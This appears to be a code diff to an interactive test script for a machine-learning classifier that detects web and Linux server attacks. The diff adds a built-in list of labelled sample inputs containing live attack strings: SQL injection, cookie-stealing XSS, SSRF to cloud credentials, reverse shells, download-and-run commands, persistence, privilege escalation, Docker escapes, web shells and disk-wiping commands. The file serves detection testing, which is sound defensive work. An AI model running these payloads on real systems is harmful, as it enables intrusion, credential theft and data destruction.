@@ -2,20 +2,77 @@
 interactive_test.py
 ===================
 Interactive CLI Testing Tool for Enterprise VPS Security AI (48 Classes).
-Allows testing both Web Attacks and Linux/Server Attacks interactively.
+Contains a rich built-in collection of mixed Web & Server attack payloads.
 """
 
-import pandas as pd
-import os
 import random
 from transformers import pipeline, AutoModelForSequenceClassification, AutoTokenizer
 
 MODEL_DIR = "./trained_model"
 
-# Try loading enterprise_security_dataset.csv, fallback to test_dataset.csv
-DATASET_PATH = "./enterprise_security_dataset.csv"
-if not os.path.exists(DATASET_PATH):
-    DATASET_PATH = "./test_dataset.csv"
+# Built-in collection of mixed Web and Linux/Server attack payloads
+SAMPLE_PAYLOADS = [
+    # --- WEB ATTACKS ---
+    ("SQL_Injection",                 "' OR 1=1 --"),
+    ("SQL_Injection",                 "SELECT * FROM users WHERE id=1 UNION SELECT null, username, password FROM admin_users;--"),
+    ("SQL_Injection",                 "1'; DROP TABLE orders;--"),
+    ("XSS",                           "<script>alert('xss_vulnerability')</script>"),
+    ("XSS",                           "<img src=x onerror=alert('cookie:'+document.cookie)>"),
+    ("PathTraversal",                 "../../../../etc/passwd"),
+    ("PathTraversal",                 "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow"),
+    ("SSRF",                          "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("SSRF",                          "gopher://localhost:6379/_FLUSHALL"),
+    ("XXE",                           "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
+    ("NoSQL_Injection",               "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$ne\": null}}"),
+    ("Command_Injection",             "127.0.0.1; cat /etc/passwd"),
+    ("FileUpload_Attack",            "filename=\"webshell.php.png\""),
+    ("CSRF",                          "<form action=\"http://example.com/api/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"10000\"></form><script>document.forms[0].submit()</script>"),
+    ("SSTI",                          "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}"),
+
+    # --- SERVER / LINUX ATTACKS ---
+    ("SSH_BruteForce",                "Aug 04 14:30:00 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2"),
+    ("SSH_BruteForce",                "Aug 04 14:30:05 server sshd[1235]: Failed password for invalid user admin from 45.33.32.156 port 41200 ssh2"),
+    ("SSH_Login_Attack",              "Aug 04 14:31:00 server sshd[5678]: Invalid user test_account from 10.0.0.5 port 43210"),
+    ("ReverseShell",                 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+    ("ReverseShell",                 "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.50\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
+    ("PrivilegeEscalation",          "sudo -u root /usr/bin/find / -exec /bin/sh \\;"),
+    ("PrivilegeEscalation",          "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p"),
+    ("Suspicious_Bash_Command",       "history -c && unset HISTFILE && export HISTFILESIZE=0"),
+    ("Suspicious_Bash_Command",       "shred -zu ~/.bash_history && echo '' > /var/log/auth.log"),
+    ("Linux_Command_Injection",       "; rm -rf / --no-preserve-root"),
+    ("WebShell",                      "<?php system($_GET['cmd']); ?>"),
+    ("WebShell",                      "<?php echo shell_exec($_REQUEST['c']); ?>"),
+    ("PortScanning",                 "nmap -sS -p 1-65535 192.168.1.0/24"),
+    ("PortScanning",                 "masscan -p1-65535 10.0.0.0/16 --rate=10000"),
+    ("Docker_Abuse",                  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
+    ("Docker_Abuse",                  "docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -i -n -- /bin/bash"),
+    ("Cron_Abuse",                    "echo '* * * * * root /tmp/backdoor.sh' >> /etc/crontab"),
+    ("Cron_Abuse",                    "echo '*/5 * * * * curl http://192.168.1.50/c | bash' | crontab -"),
+    ("Persistence",                   "echo 'ssh-rsa AAAA3NzaC1yc2E... attacker@evil' >> /root/.ssh/authorized_keys"),
+    ("Persistence",                   "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/profile"),
+    ("Malicious_System_Command",      "dd if=/dev/urandom of=/dev/sda bs=1M count=1000"),
+    ("Malicious_System_Command",      "mkfs.ext4 /dev/sda1"),
+    ("Unauthorized_File_Modification", "chmod 4755 /tmp/rootkit; chown root:root /tmp/rootkit"),
+    ("Unauthorized_File_Modification", "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"),
+    ("Suspicious_Process",            "root 1234 99.0 /tmp/.ICE-unix/xmrig -o stratum+tcp://pool.supportxmr.com:443"),
+    ("System_Enumeration",            "cat /etc/passwd && uname -a && id && whoami"),
+    ("System_Enumeration",            "ifconfig -a && netstat -tlnp && ps auxww"),
+    ("Kernel_Exploit",                "./dirty_cow /usr/bin/passwd"),
+    ("Kernel_Exploit",                "./CVE-2022-0847 # DirtyPipe LPE exploit"),
+    ("Linux_Malware",                 "wget http://192.168.1.50/bot.sh -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden"),
+    ("Ransomware",                    "openssl enc -aes-256-cbc -in data.db -out data.db.locked -k secretkey123"),
+    ("Cryptomining",                  "./xmrig --donate-level=0 -o pool.minexmr.com:3333 -u 4wallet..."),
+    ("Failed_Login",                  "Aug 04 14:32:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=user1"),
+    ("Root_Login_Attempt",            "Aug 04 14:33:00 server sshd[9012]: Accepted password for root from 185.220.101.1 port 22 ssh2"),
+    ("Lateral_Movement",              "scp /tmp/payload.sh user@10.0.0.2:/tmp/ && ssh user@10.0.0.2 'bash /tmp/payload.sh'"),
+
+    # --- BENIGN TRAFFIC ---
+    ("Benign",                        "GET /api/v1/products?category=electronics HTTP/1.1"),
+    ("Benign",                        "POST /api/v1/users/login HTTP/1.1\nHost: example.com\n\nusername=john_doe&password=secretPass123!"),
+    ("Benign",                        "Aug 04 14:35:00 server systemd[1]: Started Daily Cleanup of Temporary Directories."),
+    ("Benign",                        "Aug 04 14:36:00 server sshd[1122]: Accepted publickey for deploy from 10.0.0.1 port 52100 ssh2"),
+    ("Benign",                        "Aug 04 14:37:00 server CRON[1456]: (root) CMD (/usr/lib/php/sessionclean)"),
+]
 
 # Severity weights for risk calculation
 ATTACK_SEVERITY_WEIGHTS = {
@@ -65,20 +122,14 @@ classifier = pipeline(
     device=-1
 )
 
-df = None
-if os.path.exists(DATASET_PATH):
-    print(f"Loading dataset from: {DATASET_PATH}...")
-    df = pd.read_csv(DATASET_PATH)
-    print(f"Dataset loaded: {len(df)} samples across {df['label'].nunique()} categories.")
-
 num_classes = model.config.num_labels
-print("\n" + "="*70)
+print("\n" + "="*75)
 print(f"🛡️  INTERACTIVE TEST MODE — ENTERPRISE VPS SECURITY AI ({num_classes} Classes)")
-print("="*70)
-print("  - Press [ENTER] to pull a random payload from the dataset.")
-print("  - Type any custom string (web attack, log line, bash command) to evaluate.")
+print("="*75)
+print("  - Press [ENTER] to pull a random mixed payload (Web or Server attack).")
+print("  - Type any custom string (web payload, log line, bash command) to evaluate.")
 print("  - Type 'quit' or 'exit' to stop.")
-print("="*70 + "\n")
+print("="*75 + "\n")
 
 while True:
     try:
@@ -89,14 +140,8 @@ while True:
             break
             
         if not user_input:
-            if df is not None:
-                row = df.sample(1).iloc[0]
-                text = str(row['text'])
-                true_label = row['label']
-                print(f"\n[Random Dataset Sample — Ground Truth Label: {true_label}]")
-            else:
-                print("No dataset loaded. Please enter a custom payload.")
-                continue
+            expected_category, text = random.choice(SAMPLE_PAYLOADS)
+            print(f"\n[Random Sample — Category: {expected_category}]")
         else:
             text = user_input
             print(f"\n[Custom Input Evaluation]")
